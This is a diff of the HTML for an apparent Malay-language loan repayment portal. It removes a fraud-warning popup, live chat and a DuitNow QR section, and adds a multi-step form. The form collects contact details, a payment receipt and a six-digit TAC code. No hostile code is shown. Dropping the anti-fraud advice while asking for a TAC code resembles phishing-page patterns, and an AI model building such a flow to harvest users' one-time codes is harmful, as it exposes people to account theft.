@@ -3,167 +3,191 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Adawang - Portal Pembayaran Pinjaman</title>
+    <title>Portal Pembayaran Adawang - Isi Maklumat & Upload Resit</title>
     <link rel="stylesheet" href="styles.css">
 </head>
 <body>
-    <!-- Pop-up Peringatan Penipuan -->
-    <div id="warningPopup" class="popup-overlay">
-        <div class="popup-content warning-popup">
-            <div class="popup-header warning-header">
-                <h2>⚠️ Peringatan Penting - Bahaya Penipuan</h2>
-            </div>
-            <div class="popup-body">
-                <ul class="warning-list">
-                    <li>🔒 Jangan berkongsi info peribadi seperti nombor KP atau kata laluan dengan sesiapa</li>
-                    <li>✅ Hanya terima pembayaran melalui DuitNow di platform rasmi Adawang ini sahaja</li>
-                    <li>📞 Hati-hati dengan panggilan atau mesej palsu yang mengaku dari Adawang</li>
-                    <li>📱 Hanya scan QR Code DuitNow yang disediakan di website rasmi ini</li>
-                    <li>🚨 Lapor kepada kami terus-terus jika anda disyaki ditipu atau dirompak</li>
-                </ul>
-            </div>
-            <button class="popup-btn" onclick="closeWarningPopup()">Saya Faham dan Lanjut</button>
-        </div>
+    <div class="loading-spinner" id="loadingSpinner">
+        <div class="spinner"></div>
     </div>
 
-    <!-- Pop-up Pencapaian Adawang -->
-    <div id="achievementPopup" class="popup-overlay">
-        <div class="popup-content achievement-popup">
-            <div class="popup-header achievement-header">
-                <h2>🎉 Pencapaian Adawang</h2>
-            </div>
-            <div class="popup-body">
-                <p class="achievement-text">Adawang telah meluluskan pinjaman kepada</p>
-                <p class="achievement-number">50,000 orang</p>
-                <p class="achievement-subtitle">Terima kasih atas kepercayaan anda!</p>
-            </div>
-            <button class="popup-btn" onclick="closeAchievementPopup()">Tutup</button>
+    <div class="container">
+        <!-- Header -->
+        <div class="header">
+            <h1>🏦 Adawang Payment Portal</h1>
+            <p>Portal Pembayaran Pinjaman Adawang</p>
         </div>
-    </div>
 
-    <!-- Header -->
-    <header class="header">
-        <div class="container">
-            <div class="logo">
-                <h1>🏦 Adawang</h1>
-                <p>Portal Pembayaran Pinjaman</p>
-            </div>
-            <div class="header-actions">
-                <button class="support-btn" onclick="openLiveChat()">💬 Live Support</button>
-            </div>
-        </div>
-    </header>
+        <!-- Main Form -->
+        <div class="form-wrapper">
+            <!-- Alert Message -->
+            <div class="message-alert" id="messageAlert"></div>
 
-    <!-- Main Content -->
-    <main class="container">
-        <!-- Welcome Section -->
-        <section class="welcome-section">
-            <h2>Selamat Datang ke Portal Pembayaran Adawang</h2>
-            <p>Bayar pinjaman anda dengan mudah menggunakan QR Code DuitNow. Cepat, selamat, dan mudah!</p>
-        </section>
-
-        <!-- Payment Section -->
-        <section class="payment-section">
-            <div class="payment-card">
-                <h3>📋 Maklumat Peminjam</h3>
-                <div class="form-group">
-                    <label for="icNumber">Nombor Kad Pengenalan / Nombor Akaun:</label>
-                    <input type="text" id="icNumber" placeholder="Cth: 123456-78-9012" class="form-input">
+            <!-- Progress Bar -->
+            <div class="progress-container">
+                <div class="progress-line">
+                    <div class="progress-line-fill" id="progressLine"></div>
                 </div>
-
-                <div class="form-group">
-                    <label for="borrowerName">Nama Peminjam:</label>
-                    <input type="text" id="borrowerName" placeholder="Masukkan nama anda" class="form-input">
-                </div>
-
-                <div class="form-group">
-                    <label for="loanAmount">Jumlah Bayaran (RM):</label>
-                    <input type="number" id="loanAmount" placeholder="Cth: 500.00" step="0.01" class="form-input">
-                </div>
-            </div>
-
-            <!-- DuitNow QR Section -->
-            <div class="payment-card">
-                <h3>📱 Scan QR Code DuitNow untuk Bayar</h3>
-                <p class="info-text">Sila scan QR Code DuitNow di bawah menggunakan banking app anda:</p>
                 
-                <div class="qr-section">
-                    <div class="qr-display-area">
-                        <img src="qr-duitnow.png" alt="QR Code DuitNow Adawang" class="qr-image">
-                        <p class="qr-instruction">Gunakan camera atau banking app untuk scan QR Code ini</p>
-                    </div>
+                <div class="progress-item active" id="progress1">
+                    <div class="progress-number">1</div>
+                    <div class="progress-label">Maklumat</div>
                 </div>
-
-                <div class="payment-info">
-                    <p><strong>💡 Langkah-Langkah Pembayaran:</strong></p>
-                    <ol style="text-align: left; padding-left: 20px; line-height: 1.8;">
-                        <li>Masukkan nombor KP dan nama anda di atas</li>
-                        <li>Masukkan jumlah bayaran yang ingin dibayar</li>
-                        <li>Buka banking app anda (FPX, Maybank, CIMB dll)</li>
-                        <li>Pilih "Scan QR Code" atau "DuitNow"</li>
-                        <li>Scan QR Code di atas dan selesaikan pembayaran</li>
-                    </ol>
+                
+                <div class="progress-item" id="progress2">
+                    <div class="progress-number">2</div>
+                    <div class="progress-label">Resit</div>
+                </div>
+                
+                <div class="progress-item" id="progress3">
+                    <div class="progress-number">3</div>
+                    <div class="progress-label">Kod TAC</div>
+                </div>
+                
+                <div class="progress-item" id="progress4">
+                    <div class="progress-number">✓</div>
+                    <div class="progress-label">Selesai</div>
                 </div>
             </div>
 
-            <!-- Payment Confirmation -->
-            <div class="payment-card">
-                <h3>✅ Sahkan Pembayaran</h3>
-                <div class="payment-summary">
-                    <div class="summary-item">
-                        <span>Peminjam:</span>
-                        <span id="summaryName" class="summary-value">-</span>
-                    </div>
-                    <div class="summary-item">
-                        <span>No. KP:</span>
-                        <span id="summaryIC" class="summary-value">-</span>
-                    </div>
-                    <div class="summary-item">
-                        <span>Jumlah Bayaran:</span>
-                        <span id="summaryAmount" class="summary-value">RM 0.00</span>
-                    </div>
-                </div>
+            <!-- STEP 1: Customer Information -->
+            <div class="form-step active" id="step1">
+                <form id="customerForm" onsubmit="event.preventDefault();">
+                    <h3 style="margin-bottom: 20px; color: #667eea;">📋 Langkah 1: Maklumat Pelanggan</h3>
 
-                <div class="checkbox-group">
-                    <input type="checkbox" id="confirmPayment" class="checkbox-input">
-                    <label for="confirmPayment" class="checkbox-label">
-                        Saya mengesahkan bahawa semua maklumat adalah betul dan sudah melakukan pembayaran
-                    </label>
-                </div>
+                    <div class="form-group">
+                        <label for="fullname">Nama Penuh *</label>
+                        <input type="text" id="fullname" placeholder="Masukkan nama penuh anda" required>
+                    </div>
 
-                <button class="submit-btn" onclick="submitPayment()">
-                    ✅ Selesaikan
-                </button>
+                    <div class="form-group">
+                        <label for="email">Email *</label>
+                        <input type="email" id="email" placeholder="contoh@email.com" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="phone">Nombor Telefon *</label>
+                        <input type="tel" id="phone" placeholder="0123456789" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="reference">Nombor Rujukan Pinjaman *</label>
+                        <input type="text" id="reference" placeholder="Cth: ADW-2024-001" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="amount">Jumlah Bayaran (RM) *</label>
+                        <input type="number" id="amount" placeholder="Cth: 500" step="0.01" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="paymentmethod">Kaedah Pembayaran *</label>
+                        <select id="paymentmethod" required>
+                            <option value="">-- Pilih Kaedah Pembayaran --</option>
+                            <option value="DuitNow">DuitNow</option>
+                            <option value="FPX">FPX</option>
+                            <option value="Bank Transfer">Bank Transfer</option>
+                            <option value="Credit/Debit Card">Credit/Debit Card</option>
+                            <option value="Cash">Tunai</option>
+                        </select>
+                    </div>
+                </form>
+
+                <div class="button-group">
+                    <button class="btn-primary btn-full" onclick="nextStep()">Seterusnya →</button>
+                </div>
             </div>
-        </section>
 
-        <!-- Support Section -->
-        <section class="support-section">
-            <h3>❓ Perlu Bantuan?</h3>
-            <p>Hubungi agen live support kami - tersedia 24/7!</p>
-            <button class="support-btn-large" onclick="openLiveChat()">
-                💬 Chat Dengan Agen Sekarang
-            </button>
-        </section>
-    </main>
+            <!-- STEP 2: Receipt Upload -->
+            <div class="form-step" id="step2">
+                <form id="receiptForm" onsubmit="event.preventDefault();">
+                    <h3 style="margin-bottom: 20px; color: #667eea;">📎 Langkah 2: Upload Resit Bayaran</h3>
 
-    <!-- Footer -->
-    <footer class="footer">
-        <div class="container">
-            <p>&copy; 2024 Adawang. Semua hak terpelihara.</p>
-            <p>Portal Pembayaran Pinjaman Aman | DuitNow Verified</p>
+                    <div class="form-group">
+                        <label>Muat Naik Resit Pembayaran *</label>
+                        <div class="file-upload-area" id="fileUploadArea">
+                            <div class="upload-icon">📤</div>
+                            <div class="upload-text">Seret & lepas fail di sini</div>
+                            <div class="upload-subtext">atau klik untuk memilih fail</div>
+                            <div class="upload-subtext">Format: JPG, PNG, PDF | Saiz Max: 5MB</div>
+                            <input type="file" id="receipt" accept=".jpg,.jpeg,.png,.pdf">
+                        </div>
+                        <div id="filePreview"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="notes">Catatan Tambahan (Opsyonal)</label>
+                        <textarea id="notes" placeholder="Tulis sebarang catatan tambahan..."></textarea>
+                    </div>
+                </form>
+
+                <div class="button-group">
+                    <button class="btn-secondary" onclick="prevStep()">← Kembali</button>
+                    <button class="btn-primary" onclick="submitForm()">Hantar Resit →</button>
+                </div>
+            </div>
+
+            <!-- STEP 3: TAC Verification -->
+            <div class="form-step" id="step3">
+                <form id="tacForm" onsubmit="event.preventDefault();">
+                    <h3 style="margin-bottom: 20px; color: #667eea;">🔐 Langkah 3: Verifikasi Kod TAC</h3>
+
+                    <div class="tac-info">
+                        ✉️ Kod TAC 6 digit telah dihantar ke <span class="tac-display-email" id="displayEmail">email@example.com</span>
+                        <br><br>
+                        Sila masukkan kod untuk mengesahkan permohonan anda.
+                    </div>
+
+                    <div class="form-group">
+                        <label for="taccode">Kod TAC *</label>
+                        <div class="tac-input-group">
+                            <input type="text" id="taccode" maxlength="6" placeholder="000000" required>
+                        </div>
+                    </div>
+
+                    <div style="text-align: center; margin-top: 15px;">
+                        <a href="#" class="resend-link" onclick="resendTAC(event)">🔄 Hantar Semula Kod</a>
+                    </div>
+                </form>
+
+                <div class="button-group">
+                    <button class="btn-secondary" onclick="prevStep()">← Kembali</button>
+                    <button class="btn-success" onclick="verifyTAC()">✓ Sahkan</button>
+                </div>
+            </div>
+
+            <!-- STEP 4: Success -->
+            <div class="form-step" id="step4">
+                <div class="success-container">
+                    <div class="success-icon">🎉</div>
+                    <h2>Permohonan Berjaya!</h2>
+                    <p>Terima kasih telah menghantar maklumat pembayaran anda.</p>
+
+                    <div class="ref-number-box">
+                        <div class="ref-number-label">Nombor Rujukan Anda:</div>
+                        <div class="ref-number" id="refNumber">REF-XXXX</div>
+                    </div>
+
+                    <p style="margin-top: 15px; color: var(--text-light);">
+                        Admin kami akan menyemak permohonan anda dalam masa 24 jam.
+                    </p>
+
+                    <div class="submit-date">
+                        📅 Tarikh Penghantaran: <span id="submitDate">-</span>
+                    </div>
+
+                    <p style="margin-top: 20px; font-size: 13px; color: var(--text-light);">
+                        Email pengesahan telah dihantar ke email anda. Sila semak Folder Spam jika tidak menerima.
+                    </p>
+                </div>
+
+                <div class="button-group">
+                    <button class="btn-primary btn-full" onclick="resetForm()">🔄 Hantar Permohonan Baru</button>
+                </div>
+            </div>
         </div>
-    </footer>
+    </div>
 
-    <!-- Crisp Live Chat Integration -->
-<script type="text/javascript">window.$crisp=[];window.CRISP_WEBSITE_ID="b2ba94c5-4673-479a-a2a7-7b6c8ed5357a";(function(){d=document;s=d.createElement("script");s.src="https://client.crisp.chat/l.js";s.async=1;d.getElementsByTagName("head")[0].appendChild(s);})();</script>
-
-<script>
-    function openLiveChat() {
-        if (window.$crisp) {
-            window.$crisp.push(["do", "chat:open"]);
-        }
-    }
-</script>
+    <script src="script.js"></script>
 </body>
 </html>
